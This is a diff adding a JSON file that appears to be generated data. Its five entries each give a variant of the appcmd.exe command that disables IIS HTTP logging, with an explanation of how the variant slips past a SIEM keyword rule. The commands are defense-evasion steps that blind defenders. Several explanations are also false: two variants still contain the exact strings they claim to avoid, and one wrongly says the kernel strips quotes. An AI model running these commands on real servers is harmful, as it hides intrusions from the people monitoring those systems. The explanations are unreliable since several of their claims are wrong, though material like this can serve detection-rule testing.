@@ -1,0 +1,22 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config /section:httplogging /dontLog:true",
+    "explanation": "Substitution technique: Inserting forward slash switches ('/section:' and '/dontLog:') as configuration attribute prefixes. Appcmd.exe handles IIS configuration identifiers either as direct key-value tokens (e.g., 'section:httplogging') or explicitly prefixed with forward slashes interchangeably. This variation preserves absolute functional parity for disabling logs while completely evading the exact literal string tokens 'section:httplogging' and 'dontLog:true' in 'selection_cli'."
+  },
+  {
+    "output": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"section:httplogging\" \"dontLog:true\"",
+    "explanation": "Insertion technique: Enclosing the core configuration and attribute strings inside separate pairs of explicit double quotes. The operating system kernel strips away quotation mark structures natively during child process parameter array assembly, which perfectly ensures that the application executes as intended while completely breaking the continuous, unquoted string sequence checking logic of the SIEM."
+  },
+  {
+    "output": "cmd.exe /c C:\\Windows\\System32\\inetsrv\\appcmd.exe se^t con^fig sectio^n:httplogging dontL^og:true",
+    "explanation": "Insertion technique: Utilizing a cmd.exe environment to inject a command shell caret escape operator ('^') directly into the sub-commands and assignment keys. The parent console subsystem intercepts, processes, and drops the caret token prior to launching the child process binary context, leaving a recorded process creation command-line event log footprint that successfully subverts the rigid keyword matching rules."
+  },
+  {
+    "output": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config section:\"httplogging\" dontLog:\"true\"",
+    "explanation": "Insertion technique: Wrapping only the attribute values within double quotes after the colon separator. Appcmd.exe handles strings natively when values are encapsulated, allowing the command parsing engine to assign properties identically while cleanly altering the continuous text stream to avoid the raw hardcoded sequences 'section:httplogging' and 'dontLog:true'."
+  },
+  {
+    "output": "C:\\Windows\\System32\\inetsrv\\appcmd.exe  set  config  section:httplogging  dontLog:true",
+    "explanation": "Insertion technique: Injecting multiple consecutive spaces between the parameter switches instead of a single space delimiter. The underlying operating system normalizes and flattens contiguous white spaces into individual discrete array pointers at initialization, maintaining behavioral capabilities while breaking simple, sequential whitespace alignment expectations if a rigid parser evaluates them."
+  }
+]
